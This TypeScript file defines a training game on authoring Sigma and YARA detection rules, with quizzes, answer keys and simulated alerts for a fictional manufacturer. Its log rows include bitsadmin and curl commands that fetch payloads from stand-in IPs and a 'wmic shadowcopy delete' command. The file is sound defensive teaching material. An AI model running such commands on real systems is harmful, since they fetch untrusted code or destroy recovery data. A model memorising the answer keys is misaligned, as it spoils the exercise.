import type { RoomExperience } from "./types";

// "Operation Rule and Sign" for the "sigma-yara-rule-authoring" room.
// Script: docs/campaign/107-sigma-yara-rule-authoring.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Pelham Instruments (fictional), not the graded tasks' Meridian or Solvara records.
// Mentor: Tatiana Ogunleye, Detection Content Author.
// Signature, Write It Tight: a sort of strings worth keeping against ones that burn in a day, a
// tune on string count and file size, and a spotdiff of a YARA rule that matches goodware beside
// a tight one. Rooms 73 and 96 cover use cases and programs; this room is the rule text.
// Game mix: codebreak + duel + spotdiff + tune.
//
// TASK ORDER CHANGED. In the room m1 and o1 sit before Reading 5, but m1 grades YARA operators
// Reading 5 teaches and o1 cites "Readings 3 and 6". New order, for the integrator:
//   sigyara-r1, sigyara-r2, sigyara-q1 |
//   sigyara-r3, sigyara-qf1, sigyara-r4, sigyara-qf2, sigyara-ac1 |
//   sigyara-r5, sigyara-r6, sigyara-qf3, sigyara-q2, sigyara-m1, sigyara-o1 |
//   sigyara-la1, sigyara-f1
// Readings stay in order 1 to 6, so every "Reading N" reference holds. f1 cites Readings 2 and 3
// and has no "Log Analysis N" number to break.
//
// Lab data differs from the graded tasks. The Sigma labs are bitsadmin and curl downloads (T1105)
// with blocks named sel_*, never encoded PowerShell (q1, ac1) or shadow copies (r3, qf1, qf2, f1);
// the one graded recall value, the wmic phrase in qf2, appears only as a labelled row among other
// wmic commands and is never asked. The wildcard form appears as 1 of sel_*, never the flag's
// exact text. The YARA labs are a Windows PE loader, a keylogger and a Linux miner, never a PHP
// webshell (qf3, q2); the size is 225 KB or 1 MB, never 150 KB. The rule-walk is a registry Run
// key seen by Sysmon Event 13, never LSASS access (la1), and its near miss is the same file name
// in the wrong folder. Dispositions are worded differently from la1's and never include its value.

/** The spotdiff renders in HTML, which drops plain leading spaces, and YARA reads better indented. */
const y = (depth: number, line: string) => "\u00A0".repeat(depth * 2) + line;

export const SIGMA_YARA_RULE_AUTHORING: RoomExperience = {
  roomId: "sigma-yara-rule-authoring",
  codename: "Operation Rule and Sign",
  theme: "ruleandsign",
  handler: { name: "Tatiana Ogunleye", role: "Detection Content Author, Pelham Instruments" },
  briefing: [
    "Pelham Instruments. 900 people building precision balances and calibration gear for hospital and university labs, and every firmware image ships under one signing key.",
    "On Monday the EDR (endpoint detection and response) agent pulled a small unsigned program off PEL-BLD-03, the build host that sits next to that key.",
    "The first YARA rule written for it matched 412 ordinary files and was pulled within the hour. YARA describes files, and its cousin Sigma describes log events.",
    "Tatiana Ogunleye, Detection Content Author, signs off every rule that reaches production, and the firmware signs on Friday. Start from a blank page and write it tight.",
  ],
  mission: "Sort the sample's strings, fix a draft with the right modifiers, build a Sigma rule and compile it, triage its first hits, write a YARA rule that counts and bounds, tighten the one that matched goodware, then walk a live alert back through its own logic.",
  estimate: "~60 min",
  look: { primary: "#9ad4d6", secondary: "#ffd08a", warn: "#ff5a6e" },
  scene: "facilityruleandsign",
  layout: "facility",
  stations: [
    {
      id: "sample",
      label: "The Sample",
      topic: "Too broad and too narrow · contains and all · startswith and endswith · regex · multi-block conditions",
      tagline: "What will still be there next week?",
      building: "control",
      taskIds: ["sigyara-r1", "sigyara-r2", "sigyara-q1"],
    },
    {
      id: "sigma",
      label: "The Sigma Rule",
      topic: "Building a rule step by step · logsource · pySigma backends and pipelines · judging a rule's hits",
      tagline: "A blank page and one hypothesis",
      building: "lab",
      taskIds: ["sigyara-r3", "sigyara-qf1", "sigyara-r4", "sigyara-qf2", "sigyara-ac1"],
    },
    {
      id: "yara",
      label: "The YARA Rule",
      topic: "Hex wildcards · string modifiers · filesize, counts and offsets · testing on two sets · the tuning loop",
      tagline: "Quiet on goodware, loud on the next build",
      building: "office",
      taskIds: ["sigyara-r5", "sigyara-r6", "sigyara-qf3", "sigyara-q2", "sigyara-m1", "sigyara-o1"],
    },
    {
      id: "signoff",
      label: "The Sign-Off",
      topic: "Reading an alert back against the rule that wrote it",
      tagline: "The rule fired. Does its logic hold?",
      building: "ticket",
      taskIds: ["sigyara-la1", "sigyara-f1"],
      boss: true,
    },
  ],
  personas: {
    "sigyara-q1": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Read the block the way the engine reads it." },
    "sigyara-qf1": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Fill in the parts that do the work." },
    "sigyara-qf2": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Now finish the query the SIEM will run." },
    "sigyara-ac1": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "A rule fired. Give me your call on it." },
    "sigyara-qf3": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Finish the condition, line by line." },
    "sigyara-q2": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Tell me what happened overnight and what you'd do." },
    "sigyara-m1": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Say what each one does." },
    "sigyara-o1": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Put the work in the order it really goes." },
    "sigyara-la1": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Walk this alert back through its own rule." },
    "sigyara-f1": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "One line, exactly as it goes in the file." },
  },
  briefings: {
    // ── Reading 1: from reading rules to writing them ──
    "sigyara-r1": [
      {
        kind: "sort",
        title: "Worth Keeping or Burns in a Day",
        prompt: "Tatiana has pulled these lines out of the sample from PEL-BLD-03. Sort each one: is it worth building a rule on, will the next build change it, or does ordinary software carry it too?",
        primer: {
          title: "Two Ways a Rule Misses",
          fold: true,
          points: [
            "**Too broad:** the rule rests on something ordinary software shares. Every match is a ticket, and analysts stop reading a rule that cries wolf.",
            "**Too narrow:** the rule rests on one exact value from one sample. The next build changes that value and the rule stays silent.",
            "Ask two questions of any string: who else has this, and what would it cost the author to change it?",
            "Addresses, names and encrypted data change for free. Protocols, code and habits cost real work to change.",
          ],
          example: {
            label: "Worked example: three lines from a phishing kit",
            lines: [
              "`<title>Sign in</title>`: thousands of honest login pages have this.",
              "`203.0.113.91/kit7/`: the kit's current host, gone when the host is taken down.",
              "`Thnak you for verifing`: a misspelling the kit's author copies from page to page.",
            ],
          },
        },
        buckets: [
          { id: "keep", label: "Worth keeping" },
          { id: "burn", label: "Burns in a day" },
          { id: "common", label: "Matches goodware" },
        ],
        items: [
          { id: "s1", text: "203.0.113.58", bucket: "burn", why: "The address the sample calls home to. A server is rented by the week, and one setting in the next build points somewhere else." },
          { id: "s2", text: "VirtualAlloc", bucket: "common", why: "A Windows memory function that a huge share of ordinary programs use. Alone it says nothing about this sample." },
          { id: "s3", text: "id=%s&st=%d&ck=%08x", bucket: "keep", why: "The format of the sample's check-in message. The server has to parse the same format, so changing it means changing both ends." },
          { id: "s4", text: "calhelper.exe", bucket: "burn", why: "The file's own name. Renaming it costs one keystroke." },
          { id: "s5", text: "This program cannot be run in DOS mode", bucket: "common", why: "The stub text at the start of nearly every Windows executable. It proves the file is a program, nothing more." },
          { id: "s6", text: "conect fail retry", bucket: "keep", why: "A typo in an error message. No honest program shares it, and authors rarely go back to reread their own error strings." },
          { id: "s7", text: "A 1,024-byte encrypted config, copied whole", bucket: "burn", why: "Each build encrypts it with a new key, so every byte differs next time. Matching the whole blob finds this build and no other." },
          { id: "s8", text: "http://", bucket: "common", why: "Every updater, browser and licence checker carries it." },
          { id: "s9", text: "33 C1 C1 C0 05, the sample's decode step, repeated at every hidden string", bucket: "keep", why: "This is code doing the work. Rewriting a decoder across a whole project costs far more than changing a value." },
          { id: "s10", text: "Campaign tag nov-04-b", bucket: "burn", why: "A label the operator sets per campaign. It's different by next month at the latest." },
          { id: "s11", text: "\\\\.\\pipe\\pcal_ctl", bucket: "keep", why: "The named pipe the operator's controller connects to. Both ends have to agree on it, and this exact name doesn't turn up in ordinary software." },
          { id: "s12", text: "kernel32.dll", bucket: "common", why: "A core Windows library. Almost every Windows program names it." },
        ],
      },
    ],
    // ── Reading 2: modifiers and quantifiers ──
    "sigyara-r2": [
      {
        kind: "duel",
        title: "Fix the Draft With the Right Modifier",
        prompt: "The sample's next stage came down through a built-in download tool, and Sunil Abara, the on-call analyst, drafted a Sigma rule for it. Each round the draft misbehaves in a new way. Play the modifier or condition that fixes it.",
        primer: {
          title: "What Each Modifier Changes",
          fold: true,
          points: [
            "A modifier follows the field after a pipe: `Field|modifier: value`. Without one, the value must equal the whole field. Plain text matches ignore case.",
            "`contains` searches anywhere in the value. A list under one field is OR, so any one item is enough. Adding `|all` makes it AND: every item must appear, in any order.",
            "`startswith` and `endswith` pin the match to one end of the value.",
            "`re` takes a full regular expression. It can say what the others can't, and a loose pattern matches far more than you meant, so try the others first.",
            "A condition can join named blocks: `a or b`, `1 of sel_*` for any block whose name starts that way, and `all of them` for every block on the same event.",
          ],
          example: {
            label: "Worked example: copying a registry hive with reg.exe",
            lines: [
              "`CommandLine|contains: ['save', 'hklm\\sam']` fires on either item, so `reg save hklm\\software` matches.",
              "`CommandLine|contains|all: ['save', 'hklm\\sam']` needs both in the same value.",
            ],
          },
        },
        attacker: "Sunil's draft",
        moves: [
          { id: "m1", move: "It fires on a script that only mentions a URL", detail: "CommandLine|contains: ['/transfer', 'http']. An IT script echoing a URL in a comment matched, and the intent was both items in one command line.", counter: "all", hint: "This list currently means any one item.", why: "A list under one field is OR by default. Adding |all makes it AND, so a line holding only one of the two no longer fires." },
          { id: "m2", move: "It fires on a lab report tool", detail: "Image|contains: 'curl'. C:\\Tools\\curlew_report.exe matched, because the four letters sit inside another name.", counter: "endswith", hint: "Image is a full path. Where in that path is the program's own name?", why: "Image|endswith: '\\curl.exe' pins the match to the end of the path. That's strict about which program ran and loose about which folder holds it." },
          { id: "m3", move: "It fires on an archive disk", detail: "Image|contains: '\\Users\\'. The intent was programs run from a profile on C:, and D:\\Archive\\Users\\old\\fw_tool.exe matched.", counter: "startswith", hint: "Which end of the path holds the part you care about?", why: "Image|startswith: 'C:\\Users\\' anchors the match to the beginning of the value, so the same words deeper in another path don't count." },
          { id: "m4", move: "It can't describe a bare IP address", detail: "The sample always fetches from a raw address, never a hostname. No list of fixed words covers every possible address.", counter: "re", hint: "You need to describe a shape, not a word.", why: "CommandLine|re: 'https?://[0-9]{1,3}(\\.[0-9]{1,3}){3}/' describes the shape of the address. It's the right tool here because the simpler modifiers can't say this at all." },
          { id: "m5", move: "One block can't hold two tools", detail: "bitsadmin needs /transfer and curl needs -o, and everything in one block must pass on one event. Sunil split them into sel_bits and sel_curl, but the condition still names only sel_bits.", counter: "oneof", hint: "One run uses one tool, and a third tool may join later.", why: "1 of sel_* matches if any block whose name starts with sel_ matches, so adding a sel_certreq block later needs no edit to the condition." },
        ],
        cards: [
          { id: "plain", name: "|contains", effect: "A substring anywhere. A list means any one item." },
          { id: "all", name: "|contains|all", effect: "Every listed item must appear." },
          { id: "startswith", name: "|startswith", effect: "Matches at the beginning of the value." },
          { id: "endswith", name: "|endswith", effect: "Matches at the end of the value." },
          { id: "re", name: "|re", effect: "A full regular expression." },
          { id: "oneof", name: "1 of sel_*", effect: "Any one block named sel_ something." },
          { id: "allof", name: "all of them", effect: "Every block in the rule, on one event." },
        ],
        lesson: "Each modifier answers one question. Must every item appear, or any one? Which end of the value matters? Is this a word or a shape? Does one block have to match, or all of them? Most loose rules come from leaving one of those questions at its default.",
        howTo: ["Read what the draft just did.", "Play the one modifier or condition that fixes it.", "A wrong card costs a life, and a played card is gone."],
      },
      {
        kind: "worksheet",
        title: "Does This Block Fire?",
        prompt: "Sunil's fixed block is in the caption over the table. Six process events came in from Pelham's build network: work out which ones it matches.",
        caption: "selection: Image|endswith '\\bitsadmin.exe' AND CommandLine|contains|all ['/transfer', '/priority'] · condition: selection",
        primer: {
          title: "Reading One Block",
          fold: true,
          points: [
            "Every line in a block must pass on the same event. Lines are AND, lists under one field are OR unless `|all` says otherwise.",
            "`Image` is the file of the process this event is about. `CommandLine` is how that process was started. Mentioning a program in a command line doesn't make it the Image.",
            "`endswith` looks only at the end of the path, so the folder can be anything.",
          ],
          example: {
            label: "Worked example: Image|endswith '\\net.exe' AND CommandLine|contains 'group'",
            lines: [
              "`net group \"Domain Admins\" /domain` run by `net.exe`: both lines pass, it fires.",
              "`whoami /groups` run by `whoami.exe`: the word is there, the program isn't, so it stays quiet.",
              "`net user` run by `net.exe`: the program is there, the word isn't, so it stays quiet.",
            ],
          },
        },
        columns: ["Row", "Image", "CommandLine"],
        rows: [
          ["A", "C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /transfer fw /priority high http://203.0.113.58/u.bin C:\\ProgramData\\u.bin"],
          ["B", "C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /transfer fw /download http://203.0.113.58/u.bin C:\\ProgramData\\u.bin"],
          ["C", "C:\\Python312\\python.exe", "python fetch.py --note \"bitsadmin /transfer /priority\""],
          ["D", "C:\\Windows\\System32\\bitsadmin.exe", "BITSADMIN /TRANSFER sync /PRIORITY foreground http://dist.pelham.example/s.msi C:\\Temp\\s.msi"],
          ["E", "C:\\Temp\\x\\bitsadmin.exe", "bitsadmin /transfer x /priority low http://198.51.100.24/c.dll C:\\Temp\\c.dll"],
          ["F", "C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /list /allusers /verbose"],
        ],
        questions: [
          { id: "many", q: "How many of the six rows fire?", hint: "Both lines of the block must pass on the same row. Sigma ignores letter case.", answer: ["3", "three"], why: "A, D and E. D is in capitals, and Sigma matching ignores case unless the rule says |cased. B and F each lack an item, and C fails on Image." },
          { id: "python", q: "Row C's command line holds both items. Does it fire? (yes/no)", hint: "Which program does this event describe?", answer: ["no", "n"], why: "This event is about python.exe. The word bitsadmin is only text passed to it, so the Image line fails." },
          { id: "folder", q: "Row E runs from C:\\Temp\\x. Does it fire? (yes/no)", hint: "What does endswith look at?", answer: ["yes", "y"], why: "endswith checks the end of the path, so a copy in any folder still matches, as long as the file keeps that name." },
          { id: "missing", q: "Row B has /transfer and a URL. Does it fire? (yes/no)", hint: "How many items does |all need?", answer: ["no", "n"], why: "|all needs every listed item, and /priority isn't there." },
        ],
      },
    ],
    // ── Reading 3: a Sigma rule step by step ──
    "sigyara-r3": [
      {
        kind: "anatomy",
        title: "A Two-Tool Sigma Rule, Line by Line",
        prompt: "This is the rule Tatiana built from Sunil's draft for the next stage arriving through a download tool. Read it in the order it was written, because the order is the method.",
        source: "Sigma rule · rules/windows/process_creation/download_tool_fetch.yml",
        fields: [
          { key: "title", value: "Download Tool Fetches a File from the Web", label: "Name", note: "The text an analyst sees in the queue." },
          { key: "description", value: "The loader on PEL-BLD-03 pulls its next stage with a built-in download tool.", label: "Step 1: hypothesis", note: "The idea in plain language. It's written before any syntax." },
          { key: "logsource.category", value: "process_creation", label: "Step 2: which log", note: "Process starts, whichever product records them." },
          { key: "logsource.product", value: "windows", note: "With the category, this tells a converter which data the rule is about." },
          { key: "sel_bits.Image|endswith", value: "'\\bitsadmin.exe'", label: "Step 3: first tool", note: "Image holds the path of the file that ran, so this names the program itself." },
          { key: "sel_bits.CommandLine|contains|all", value: "['/transfer', 'http']", note: "Both items must appear, in any order." },
          { key: "sel_curl.Image|endswith", value: "'\\curl.exe'", label: "Step 3: second tool", note: "A separate block, because this tool takes different arguments." },
          { key: "sel_curl.CommandLine|contains|all", value: "['-o', 'http']", note: "curl's output option and a URL." },
          { key: "condition", value: "sel_bits or sel_curl", label: "Step 4: how blocks combine", note: "One run uses one tool, so either block fires the rule. To fire on a single block, a condition just names it: condition: sel_bits." },
          { key: "falsepositives", value: "Software deployment jobs; build agents fetching packages from the artifact server", label: "Step 5: legitimate matches", note: "Sigma calls these false positives. In verdict terms they're benign true positives: the rule saw a real download, and a job or a ticket is what authorises it." },
          { key: "level", value: "medium", label: "Step 6", note: "How loud the rule is. Builds fetch files every day, which is reflected here." },
          { key: "tags", value: "attack.command-and-control, attack.t1105", note: "The ATT&CK tactic and T1105, Ingress Tool Transfer. Coverage reports read these." },
        ],
        summary: "Six steps, always in this order: say the idea, pick the log, write one block per tool, join the blocks, write down what legitimately matches, then set level and tags. The Image line ties each block to a real program and the CommandLine line says what that program was doing. Together they stop the rule firing on a ticket, a script name or a note that merely mentions the same words.",
      },
      {
        kind: "worksheet",
        title: "One Phrase or Separate Words?",
        prompt: "Sunil wants to know when a phrase is enough and when the words have to be listed apart. Here are three tools as Pelham's hosts really run them.",
        caption: "Command lines from Pelham's process logs, with what can change between runs",
        primer: {
          title: "When Word Order Can Move",
          fold: true,
          points: [
            "`contains: 'a b'` is one phrase: those characters, side by side, in that order.",
            "`contains|all: ['a', 'b']` is two checks: both present, anywhere, in either order.",
            "Many tools accept their switches in any order, and put other values between them.",
            "Some tools have a fixed grammar, and there a phrase is steady.",
          ],
          example: {
            label: "Worked example: adding a local admin with net.exe",
            lines: [
              "Run: `net localgroup administrators temp /add`.",
              "`contains: 'localgroup /add'` never matches, because two values sit between the words.",
              "`contains|all: ['localgroup', '/add']` matches, whatever sits between them.",
            ],
          },
        },
        columns: ["#", "Tool", "Command as typed", "What can change"],
        rows: [
          ["1", "bitsadmin", "bitsadmin /transfer fw /download /priority high http://203.0.113.58/u.bin u.bin", "Switch order"],
          ["2", "bitsadmin", "bitsadmin /transfer fw /priority high /download http://203.0.113.58/u.bin u.bin", "Switch order"],
          ["3", "curl", "curl -o u.bin http://203.0.113.58/u.bin", "Option order"],
          ["4", "curl", "curl http://203.0.113.58/u.bin -o u.bin", "Option order"],
          ["5", "wmic", "wmic process call create \"notepad.exe\"", "Nothing: alias, then verb"],
          ["6", "wmic", "wmic useraccount list brief", "Nothing: alias, then verb"],
          ["7", "wmic", "wmic shadowcopy delete", "Nothing: alias, then verb"],
        ],
        questions: [
          { id: "phrase", q: "Rows 1 and 2 are the same download. On how many of those two does CommandLine|contains: '/download /priority' fire?", hint: "Look for those characters side by side.", answer: ["1", "one"], why: "Only row 1 has them side by side. Row 2 has the same switches in another order, so one literal phrase misses it." },
          { id: "words", q: "On how many of those two does CommandLine|contains|all: ['/download', '/priority'] fire?", hint: "Order doesn't matter here.", answer: ["2", "two"], why: "Both items are in both rows, so a change of order changes nothing." },
          { id: "fixed", q: "A rule on row 5 uses one phrase, 'process call create'. Would that phrase still match if the host name changed in a wmic /node: prefix? (yes/no)", hint: "A global switch goes before the alias.", answer: ["yes", "y"], why: "wmic reads alias, then verb, so those words stay together. Where a tool's grammar holds them side by side, one phrase is steady." },
        ],
      },
    ],
    // ── Reading 4: Sigma to query ──
    "sigyara-r4": [
      {
        kind: "codebreak",
        title: "Name the Parts of a Rule Conversion",
        prompt: "Tatiana's rule is written, and nothing runs yet. Before it can reach Pelham's SIEM (Security Information and Event Management system), someone has to convert it. Crack the four terms that conversion depends on.",
        primer: {
          title: "How a Rule Becomes a Query",
          fold: true,
          points: [
            "A Sigma file doesn't run. The `sigma-cli` tool, built on the pySigma library, converts it.",
            "`sigma convert -t <target> -p <pipeline> rule.yml` takes two choices. The target, called the backend, picks the output language, and the pipeline renames fields and picks the table.",
            "In KQL, `has` matches a whole indexed term, and `contains` scans for a substring.",
            "The reasoning stays in the rule. Change SIEM and you change those two choices, not the selection.",
            "Boolean words carry straight over: Sigma's `and`, `or` and `not` stay `and`, `or` and `not` in KQL, Microsoft's query language.",
          ],
          example: {
            label: "Worked example: one line of a net.exe rule, converted for Sentinel",
            lines: [
              "Sigma: `Image|endswith: '\\net.exe'`",
              "KQL: `FolderPath endswith @'\\net.exe'`",
              "Splunk from Sysmon data often keeps the name: `Image=\"*\\\\net.exe\"`",
            ],
          },
        },
        rounds: [
          { id: "b1", clue: "What sigma-cli's -t option selects: the part that writes the rule out in one query language.", answer: "BACKEND", why: "The backend is the target language: Splunk SPL, Microsoft KQL and so on. Choose another and the same rule comes out in different syntax." },
          { id: "b2", clue: "What sigma-cli's -p option selects: the part that maps generic names onto real columns.", answer: "PIPELINE", why: "The pipeline turns Image into FolderPath for Defender data, and picks the table from the rule's logsource. It's what ties a generic rule to one data source." },
          { id: "b3", clue: "A three-letter KQL operator that matches a whole term through the index.", answer: "HAS", why: "has is fast because it looks up indexed terms. It finds transfer as a word in a command line, but it won't find part of a longer word." },
          { id: "b4", clue: "The KQL operator that finds text inside a term, at the cost of scanning it.", answer: "CONTAINS", why: "contains is KQL's true substring match, and the most literal twin of Sigma's modifier with the same name. It's slower than has, so converters and authors choose between them." },
        ],
        lesson: "Conversion is two choices: a backend for the language and a pipeline for the data. The detection reasoning stays in one file, so moving SIEM means converting again rather than rewriting.",
      },
      {
        kind: "worksheet",
        title: "Same Rule, Two SIEMs",
        prompt: "Pelham runs Sentinel, and its acquired plant in Leeds still runs Splunk. Here is one rule converted for both. Read across each row.",
        caption: "Download Tool Fetches a File from the Web, converted twice",
        columns: ["Part", "Sigma rule", "Sentinel KQL", "Splunk SPL (Sysmon add-on)"],
        rows: [
          ["Data", "category: process_creation", "DeviceProcessEvents", "EventCode=1"],
          ["Program", "Image|endswith: '\\bitsadmin.exe'", "FolderPath endswith @'\\bitsadmin.exe'", "Image=\"*\\\\bitsadmin.exe\""],
          ["Both items", "CommandLine|contains|all: ['/transfer', 'http']", "ProcessCommandLine contains '/transfer' and ProcessCommandLine contains 'http'", "CommandLine=\"*/transfer*\" CommandLine=\"*http*\""],
          ["Blocks", "sel_bits or sel_curl", "(...) or (...)", "(...) OR (...)"],
        ],
        questions: [
          { id: "lines", q: "Leeds moves from Splunk to Sentinel. How many lines of the Sigma rule have to change?", hint: "What was chosen at conversion time?", answer: ["0", "none", "zero"], why: "None. The rule keeps its logic, and only the backend and pipeline differ." },
          { id: "col", q: "Which Sentinel column carries what Sigma calls CommandLine?", hint: "Read the third row.", answer: ["ProcessCommandLine"], why: "The pipeline renames it. Sigma's Image likewise becomes FolderPath, while Splunk on Sysmon data often keeps the original names." },
          { id: "and", q: "A different rule's condition reads sel_a and sel_b. Which KQL word joins the two parenthesised groups?", hint: "Read the last row, then think about the word in this condition.", answer: ["and"], why: "The boolean word carries straight across, and each block becomes one bracketed group." },
        ],
      },
    ],
    // ── Warm-up: judging a rule's hits ──
    "sigyara-ac1": [
      {
        kind: "queue",
        title: "Four Hits From the New Rule",
        prompt: "The download rule went live in alert-only mode last night and caught four events. The old rule, hardcoded to Monday's full URL, caught none of them. Open each hit and decide.",
        console: "SIEM · Incidents",
        primer: {
          title: "A Hit Is a Question, Not a Verdict",
          fold: true,
          points: [
            "A rule says a pattern matched. The verdict comes from what's around it.",
            "`ParentImage` says what started the process. `User` says whose account ran it. Read those first.",
            "Then ask if a job or a ticket explains it, and if the destination fits the business.",
            "A rule tied to the shape of a behaviour can catch what a rule tied to one old string can't, because the next payload is different but the shape isn't.",
          ],
          example: {
            label: "Worked example: a rule on whoami.exe",
            lines: [
              "`ParentImage: ...\\w3wp.exe`, `User: IIS APPPOOL\\portal`: a web server asking who it is.",
              "`ParentImage: ...\\cmd.exe`, `User: PELHAM\\adm-helpdesk`, ticket open: an admin at work.",
              "Same rule, same command. The context around it is what differs.",
            ],
          },
        },
        actions: [
          { id: "close", label: "Close: benign true positive", tone: "close" },
          { id: "esc", label: "Escalate", tone: "escalate" },
        ],
        alerts: [
          { id: "h1", time: "02:14", severity: "Medium", rule: "Download Tool Fetches a File from the Web", entity: "PEL-BLD-03",
            fields: [{ k: "Image", v: "C:\\Windows\\System32\\curl.exe" }, { k: "ParentImage", v: "C:\\BuildAgent\\bin\\Agent.Worker.exe" }, { k: "CommandLine", v: "curl -o nuget.exe https://artifacts.pelham.example/tools/nuget.exe" }, { k: "User", v: "PELHAM\\svc-build" }],
            context: "The nightly build pipeline runs at 02:00 on this host.", answer: "close", why: "The build agent, its service account, Pelham's own artifact server and the nightly schedule all agree. The rule saw a real download and the job explains it, so write it into falsepositives." },
          { id: "h2", time: "07:48", severity: "Medium", rule: "Download Tool Fetches a File from the Web", entity: "PEL-ENG-22",
            fields: [{ k: "Image", v: "C:\\Windows\\System32\\bitsadmin.exe" }, { k: "ParentImage", v: "C:\\ProgramData\\CalSync\\calsync.exe" }, { k: "CommandLine", v: "bitsadmin /transfer u /priority foreground http://203.0.113.58/u2.bin C:\\ProgramData\\CalSync\\u2.bin" }, { k: "User", v: "PELHAM\\r.imani" }],
            context: "r.imani is a calibration engineer. No software change is open for this host.", answer: "esc", why: "A program in ProgramData started the download, and the address is the one from Monday's sample. The old rule missed this because the file name in the URL changed, which is the point of matching the shape." },
          { id: "h3", time: "09:20", severity: "Medium", rule: "Download Tool Fetches a File from the Web", entity: "PEL-QA-07",
            fields: [{ k: "Image", v: "C:\\Windows\\System32\\bitsadmin.exe" }, { k: "ParentImage", v: "C:\\Program Files\\PelhamIT\\SwCenter\\swagent.exe" }, { k: "CommandLine", v: "bitsadmin /transfer pkg /download https://dist.pelham.example/pkg/calstudio.msi C:\\Windows\\Temp\\calstudio.msi" }, { k: "User", v: "NT AUTHORITY\\SYSTEM" }],
            context: "Change CHG-20417 rolls Calibration Studio out to QA hosts this morning.", answer: "close", why: "SYSTEM can look alarming, but that's how a software agent runs. The parent, the internal source and the open change all line up." },
          { id: "h4", time: "10:05", severity: "Medium", rule: "Download Tool Fetches a File from the Web", entity: "PEL-ENG-31",
            fields: [{ k: "Image", v: "C:\\Windows\\System32\\curl.exe" }, { k: "ParentImage", v: "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" }, { k: "CommandLine", v: "curl -o c.dll http://198.51.100.24/c.dll" }, { k: "User", v: "PELHAM\\r.imani" }],
            context: "WmiPrvSE.exe is the service that runs commands sent over WMI (Windows Management Instrumentation). r.imani's normal desk is PEL-ENG-22, not this host.", answer: "esc", why: "A remote WMI launch, on a host the account doesn't use, pulling a DLL from a raw address. Same rule as the build job, entirely different context." },
        ],
      },
    ],
    // ── Reading 5: hex wildcards, counting, offsets ──
    "sigyara-r5": [
      {
        kind: "anatomy",
        title: "A YARA Rule, Line by Line",
        prompt: "Before Tatiana writes the rule for this sample, here's one from last year's case: Kestrel, a keylogger. Scan each line for what it asks of a file.",
        source: "YARA rule · rules/files/kestrel_keylogger.yar",
        primer: {
          title: "YARA in Three Parts",
          fold: true,
          points: [
            "YARA describes files. A rule has optional `meta`, then `strings` to look for, then a `condition` that must be true.",
            "Strings come in three kinds: text in double quotes, hex bytes in braces, and regular expressions between slashes.",
            "A module adds knowledge of a format. After `import \"pe\"`, a condition can read a Windows executable's parsed headers.",
          ],
          example: {
            label: "Worked example: the three kinds of string",
            lines: [
              "Text: `$t = \"cmd /c\" ascii`",
              "Hex: `$h = { E8 00 00 00 00 5B }`",
              "Regex: `$r = /[a-z2-7]{16}\\.onion/`",
            ],
          },
        },
        fields: [
          { key: "import", value: "\"pe\"", label: "Module", note: "Loads the module that reads Windows executable (PE) headers." },
          { key: "rule", value: "Kestrel_Keylogger", label: "Name" },
          { key: "$mz", value: "{ 4D 5A }", label: "Hex string", note: "The two bytes a Windows executable starts with." },
          { key: "$pipe", value: "\"\\\\\\\\.\\\\pipe\\\\kst_ctl\" ascii wide", label: "Encodings", note: "ascii is the single-byte form. wide is the UTF-16 form Windows programs often store text in, with a zero byte after each character. Listing both looks for both." },
          { key: "$verb", value: "\"flush\" fullword nocase", label: "Whole word", note: "nocase ignores letter case. fullword needs a non-alphanumeric character on each side, so it matches -flush and not autoflush." },
          { key: "$loop", value: "{ 0F B6 ?? 34 5A [2-6] 88 07 }", label: "Hex wildcards", note: "?? is any one byte. [2-6] is a gap of any 2 to 6 unknown bytes between two fixed runs, which lets one pattern fit small layout changes between builds." },
          { key: "$mz at 0", value: "in the condition", label: "Offset", note: "Ties the string to byte 0, the very start of the file." },
          { key: "filesize < 1MB", value: "in the condition", label: "Size", note: "Holds the rule to files of a size this tool could be." },
          { key: "pe.number_of_signatures == 0", value: "in the condition", label: "From the module", note: "How many code signatures the file carries. Zero means unsigned." },
          { key: "#loop > 3", value: "in the condition", label: "Count", note: "# counts how many times a string occurs. This asks for at least four." },
          { key: "1 of ($pipe, $verb)", value: "in the condition", label: "N of", note: "N of (...) needs that many strings from the list. With 1, either will do, which suits alternatives where one sample carries only one." },
        ],
        summary: "Strings say what to look for and how to read it. The condition joins them: where a string sits, how often it occurs, how big the file is, what the headers say. Each of these operators sharpens a signal that's already worth having. None of them makes a poor string useful.",
      },
      {
        kind: "worksheet",
        title: "Read the Scan Output",
        prompt: "Kestrel's rule ran over a file left on a test bench. Tatiana ran it with yara -s, which prints every string match. Read the output the way the condition does.",
        caption: "yara -s kestrel_keylogger.yar bench_unit.bin",
        primer: {
          title: "Counts and Offsets",
          fold: true,
          points: [
            "`yara -s` prints one line per match: the offset, the string's name, the bytes found.",
            "`#name` is the number of times a string occurred.",
            "`@name[i]` is the offset of occurrence number i, starting from 1.",
            "`$name at N` is true when the string occurs at exactly that offset.",
          ],
          example: {
            label: "Worked example: another file, two strings",
            lines: [
              "`0x0:$hdr`, `0x120:$key`, `0x480:$key`",
              "`#key` is 2 and `@key[2]` is 0x480.",
              "`$hdr at 0` is true. `$key at 0` is false.",
            ],
          },
        },
        columns: ["Offset", "String", "Bytes found"],
        rows: [
          ["0x0", "$mz", "4D 5A"],
          ["0x1a40", "$loop", "0F B6 08 34 5A 90 90 88 07"],
          ["0x1c12", "$loop", "0F B6 0E 34 5A 41 FF C1 88 07"],
          ["0x1f08", "$loop", "0F B6 01 34 5A 90 48 FF C0 88 07"],
          ["0x2290", "$loop", "0F B6 0B 34 5A 41 90 88 07"],
          ["0x3b60", "$pipe", "5C 00 5C 00 2E 00 5C 00 70 00 69 00 70 00 65 00 ..."],
          ["0x4410", "$verb", "Flush"],
        ],
        questions: [
